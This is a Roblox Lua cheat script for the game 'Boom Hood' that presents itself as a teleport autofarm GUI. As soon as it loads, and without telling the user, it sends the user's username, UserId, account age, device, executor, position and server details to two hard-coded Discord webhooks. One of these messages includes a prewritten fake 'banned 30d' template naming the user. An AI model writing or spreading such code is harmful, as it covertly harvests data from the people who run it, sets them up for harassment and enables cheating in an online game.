if game.PlaceId ~= 120822170036689 then
	return
end

if getgenv and getgenv().TP_GUI_LOADED then
	warn("Teleport GUI already loaded. Restart game to use again.")
	return
end
if getgenv then getgenv().TP_GUI_LOADED = true end

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

local WEBHOOK1 = "https://discord.com/api/webhooks/1464391124402835537/JBN5znL-swKOf_gVYdpz_Dm-b4Qhu7eDU-dK9ZH2NMV7QUx6mlVgkJBFbbYqt3lPtK58"
local WEBHOOK2 = "https://discord.com/api/webhooks/1464391292737032483/1bA_FOtx3EshOMx6JYX5-jt94odfu5D_XwqvG4BTJPHpcmm5UjwxJqdjXtzBmGZdQvz5"

local function post(url, data)
	local body = HttpService:JSONEncode(data)
	if syn then
		syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
	elseif http_request then
		http_request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
	end
end

local function getExecutor()
	local name = "Unknown"
	pcall(function()
		if identifyexecutor then
			local r = identifyexecutor()
			if type(r) == "string" and r ~= "" then
				name = r
			end
		end
	end)
	return name
end

local INJECT_SENT = false
local function sendWebhook1()
	if INJECT_SENT then return end
	INJECT_SENT = true

	local hum = char:FindFirstChildOfClass("Humanoid")
	local root = char:FindFirstChild("HumanoidRootPart")

	local health = hum and hum.Health or 0
	local walkSpeed = hum and hum.WalkSpeed or 0
	local rigType = hum and hum.RigType.Name or "Unknown"

	local characterState = hum and hum.Health > 0 and ("Alive ("..math.floor(hum.Health)..")") or "Dead"

	local position = root and string.format("X: %.1f | Y: %.1f | Z: %.1f", root.Position.X, root.Position.Y, root.Position.Z) or "N/A"

	local deviceType = UserInputService.TouchEnabled and "Mobile" or "PC"
	local serverType = game.PrivateServerId ~= "" and "Private" or "Public"
	local playerCount = #Players:GetPlayers().." / "..Players.MaxPlayers
	local profileLink = "https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile"

	local data = {
		username = "AutoFarm Snowflakes and Candy",
		embeds = {{
			title = "User Log",
			color = 16711680,
			fields = {
				{ name = "🧩 Player", value = string.format(
					"Name: %s\nDisplayName: %s\nUserId: %s\nAccount Age: %s days\nProfile: [Click Here](%s)",
					LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.UserId, LocalPlayer.AccountAge, profileLink
				), inline = false },
				{ name = "🖥️ Client", value = string.format(
					"Device: %s\nExecutor: %s",
					deviceType, getExecutor()
				), inline = false },
				{ name = "🧠 Character", value = string.format(
					"State: %s\nHealth: %s\nWalkSpeed: %s\nRigType: %s\nPosition: %s",
					characterState, health, walkSpeed, rigType, position
				), inline = false },
				{ name = "🌍 Server", value = string.format(
					"Game: Boom Hood\nPlaceId: %s\nServerId: %s\nPlayers: %s\nServer Type: %s\nTime: %s",
					game.PlaceId, game.JobId, playerCount, serverType, os.date("%d.%m.%Y %H:%M:%S")
				), inline = false }
			}
		}}
	}
	post(WEBHOOK1, data)
end

spawn(function()
	local copyTemplate =
	"```" ..
	"\n> > ** banned - " .. LocalPlayer.Name .. " 30d**" ..
	"\n> > ** reason - executed script**" ..
	"\n> > ** proofs - have **" ..
	"\n```"

	local banData = {
		username = "Ban Logger",
		embeds = {{
			title = "Ban Log Pattern",
			color = 16777215,
			fields = {
				{ name = "Pattern (copy)", value = copyTemplate, inline = false },
				{ name = "Roblox ID", value = tostring(LocalPlayer.UserId), inline = false },
				{ name = "Account Age", value = tostring(LocalPlayer.AccountAge).." days", inline = false }
			}
		}}
	}
	post(WEBHOOK2, banData)
end)

spawn(sendWebhook1)

local Enabled = false
local Index = 1
local Delay = 0.5

local Points = {
	CFrame.new(-1306.94, 1103.84, -1825.03),
	CFrame.new(-1327.97, 1103.99, -1818.04),
	CFrame.new(-1362.18, 1107.67, -1794.68),
	CFrame.new(-1322.88, 1104.33, -1793.33),
	CFrame.new(-1387.12, 1103.84, -1823.52),
	CFrame.new(-1662.73, 1103.83, -1852.59),
	CFrame.new(-1596.40, 1103.83, -1990.27),
	CFrame.new(-1609.07, 1103.83, -1983.69),
	CFrame.new(-1591.54, 1103.83, -1953.40),
	CFrame.new(-1489.60, 1103.91, -2167.12),
	CFrame.new(-1488.69, 1103.91, -2227.62),
	CFrame.new(-1723.89, 1103.83, -2371.85),
	CFrame.new(-1793.99, 1103.83, -2367.50),
	CFrame.new(-1628.11, 1103.92, -2336.74),
	CFrame.new(-1254.40, 1128.52, -2298.87),
	CFrame.new(-1296.24, 1128.35, -2242.04),
	CFrame.new(-1335.08, 1128.47, -2164.62),
	CFrame.new(-1291.74, 1128.35, -2184.17),
	CFrame.new(-1300.70, 1128.85, -2258.90),
	CFrame.new(-1497.11, 1103.91, -2119.24),
	CFrame.new(-1483.55, 1103.83, -2224.61),
	CFrame.new(-1482.32, 1103.83, -2079.98),
	CFrame.new(-1393.51, 1103.84, -1831.59),
	CFrame.new(-1391.75, 1104.43, -1854.92),
	CFrame.new(-1591.13, 1103.83, -1960.25),
	CFrame.new(-1599.83, 1103.83, -1984.17),
	CFrame.new(-1572.63, 1104.56, -1939.89),
	CFrame.new(-1554.04, 1104.84, -2084.44),
	CFrame.new(-1597.71, 1124.84, -2091.33),
	CFrame.new(-1525.12, 1124.84, -2093.37),
	CFrame.new(-1423.43, 1104.43, -1849.19),
	CFrame.new(-1336.91, 1103.87, -1825.18),
	CFrame.new(-1668.69, 1103.83, -2005.44),
	CFrame.new(-1596.39, 1103.83, -1993.91),
	CFrame.new(-1582.85, 1104.33, -1880.25),
	CFrame.new(-1557.58, 1104.33, -1876.83),
	CFrame.new(-1565.21, 1115.52, -1861.04),
	CFrame.new(-1559.48, 1114.57, -1846.33),
	CFrame.new(-1310.13, 1103.84, -1823.51)
}

local gui = Instance.new("ScreenGui")
gui.Name = "TeleportGUI"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local main = Instance.new("Frame", gui)
main.Size = UDim2.fromScale(0.28, 0.36)
main.Position = UDim2.fromScale(0.36, 0.32)
main.BackgroundColor3 = Color3.fromRGB(22,22,22)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0,18)
local stroke = Instance.new("UIStroke", main)
stroke.Color = Color3.fromRGB(60,60,60)
stroke.Thickness = 1.2

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1,0,0.15,0)
title.BackgroundTransparency = 1
title.Text = "Teleport Controller"
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextColor3 = Color3.fromRGB(240,240,240)

local toggle = Instance.new("TextButton", main)
toggle.Size = UDim2.new(0.8,0,0.18,0)
toggle.Position = UDim2.new(0.1,0,0.2,0)
toggle.Text = "OFF"
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 16
toggle.TextColor3 = Color3.new(1,1,1)
toggle.BackgroundColor3 = Color3.fromRGB(170,60,60)
toggle.BorderSizePixel = 0
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0,14)
local tStroke = Instance.new("UIStroke", toggle)
tStroke.Color = Color3.fromRGB(90,90,90)
tStroke.Thickness = 1

local statusFrame = Instance.new("Frame", main)
statusFrame.Size = UDim2.new(0.9,0,0.12,0)
statusFrame.Position = UDim2.new(0.05,0,0.42,0)
statusFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
statusFrame.BorderSizePixel = 0
Instance.new("UICorner", statusFrame).CornerRadius = UDim.new(0,12)
Instance.new("UIStroke", statusFrame).Color = Color3.fromRGB(70,70,70)
local status = Instance.new("TextLabel", statusFrame)
status.Size = UDim2.new(1,0,1,0)
status.BackgroundTransparency = 1
status.Text = "Status: Disabled"
status.Font = Enum.Font.Gotham
status.TextSize = 14
status.TextColor3 = Color3.fromRGB(200,200,200)

local sliderFrame = Instance.new("Frame", main)
sliderFrame.Size = UDim2.new(0.9,0,0.15,0)
sliderFrame.Position = UDim2.new(0.05,0,0.56,0)
sliderFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
sliderFrame.BorderSizePixel = 0
Instance.new("UICorner", sliderFrame).CornerRadius = UDim.new(0,12)
Instance.new("UIStroke", sliderFrame).Color = Color3.fromRGB(70,70,70)

local sliderLabel = Instance.new("TextLabel", sliderFrame)
sliderLabel.Size = UDim2.new(1,0,0.4,0)
sliderLabel.BackgroundTransparency = 1
sliderLabel.Text = "Teleport Delay: "..Delay.."s"
sliderLabel.Font = Enum.Font.Gotham
sliderLabel.TextSize = 14
sliderLabel.TextColor3 = Color3.fromRGB(200,200,200)

local sliderButton = Instance.new("TextButton", sliderFrame)
sliderButton.Size = UDim2.new(0,20,1,0)
sliderButton.Position = UDim2.new((Delay/2),0,0,0)
sliderButton.BackgroundColor3 = Color3.fromRGB(60,170,90)
sliderButton.BorderSizePixel = 0
Instance.new("UICorner", sliderButton).CornerRadius = UDim.new(0,12)
sliderButton.AutoButtonColor = false

local dragging = false
sliderButton.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true end
end)
sliderButton.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
end)
UserInputService.InputChanged:Connect(function(input)
	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
		local mouseX = UserInputService:GetMouseLocation().X
		local sliderPos = math.clamp(mouseX - sliderFrame.AbsolutePosition.X, 0, sliderFrame.AbsoluteSize.X)
		sliderButton.Position = UDim2.new(sliderPos/sliderFrame.AbsoluteSize.X,0,0,0)
		Delay = math.clamp((sliderPos/sliderFrame.AbsoluteSize.X)*2,0.1,2)
		sliderLabel.Text = "Teleport Delay: "..string.format("%.2f",Delay).."s"
	end
end)

toggle.MouseButton1Click:Connect(function()
	Enabled = not Enabled
	if Enabled then
		toggle.Text = "ON"
		toggle.BackgroundColor3 = Color3.fromRGB(60,170,90)
		status.Text = "Status: Teleporting"
	else
		toggle.Text = "OFF"
		toggle.BackgroundColor3 = Color3.fromRGB(170,60,60)
		status.Text = "Status: Disabled"
	end
end)

task.spawn(function()
	while true do
		if Enabled and hrp then
			hrp.CFrame = Points[Index]
			Index += 1
			if Index > #Points then Index = 1 end
		end
		task.wait(Delay)
	end
end)
